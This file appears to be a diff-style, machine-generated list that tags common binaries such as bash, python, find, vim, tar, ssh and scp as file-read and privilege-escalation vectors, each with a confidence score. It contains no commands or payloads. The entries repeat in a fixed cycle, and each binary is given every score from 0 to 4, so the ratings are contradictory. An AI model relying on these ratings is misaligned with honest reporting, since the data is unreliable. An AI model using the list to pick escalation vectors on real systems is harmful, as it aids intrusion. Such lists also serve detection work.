+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
